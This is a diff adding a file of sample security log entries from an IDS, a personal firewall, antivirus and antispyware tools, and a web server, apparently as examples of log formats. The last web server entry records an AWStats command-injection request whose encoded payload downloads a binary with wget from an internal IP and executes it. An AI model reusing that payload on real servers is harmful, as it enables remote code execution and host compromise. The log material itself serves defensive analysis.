@@ -1,0 +1,28 @@
+Intrusion Detection System 
+[**] [1:1407:9] SNMP trap udp [**] 
+[Classification: Attempted Information Leak] [Priority: 2]  
+03/06-8:14:09.082119 192.168.1.167:1052 -> 172.30.128.27:162 
+UDP TTL:118 TOS:0x0 ID:29101 IpLen:20 DgmLen:87 
+Personal Firewall 
+3/6/2006 8:14:07 AM,"Rule ""Block Windows File Sharing"" blocked (192.168.1.54, 
+netbios-ssn(139)).","Rule ""Block Windows File Sharing"" blocked (192.168.1.54, 
+netbios-ssn(139)).  Inbound TCP connection.  Local address,service is 
+(KENT(172.30.128.27),netbios-ssn(139)).  Remote ad
+dress,service is 
+(192.168.1.54,39922).  Process name is ""System""." 
+3/3/2006 9:04:04 AM,Firewall configuration updated: 398 rules.,Firewall configuration 
+updated: 398 rules. 
+Antivirus Software, Log 1 
+3/4/2006 9:33:50 AM,Definition File Download,KENT,userk,Definition downloader 
+3/4/2006 9:33:09 AM,AntiVirus Startup,KENT,userk,System 
+3/3/2006 3:56:46 PM,AntiVirus Shutdown,KENT,userk,System 
+Antivirus Software, Log 2 
+240203071234,16,3,7,KENT,userk,,,,,,,16777216,"Virus definitions are 
+current.",0,,0,,,,,0,,,,,,,,,,SAVPROD,{ xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx },End 
+User,(IP)-192.168.1.121,,GROUP,0:0:0:0:0:0,90.0.0.338,,,,,,,,,,,,,,, 
+Antispyware Software 
+DSO Exploit: Data source object exploit (Registry change, nothing done)  HKEY_USERS\S-
+1-5-19\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004!=W=3 
+172.30.128.27 - - [14/Oct/2005:05:41:18 -0500] "GET /awstats/awstats.pl?config 
+dir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20192%2e168%2e1%2e214%2fnikons%3bchmod%20%2bx%
+20nikons%3b%2e%2fnikons;echo%20YYY;echo|  HTTP/1.1" 302 494 
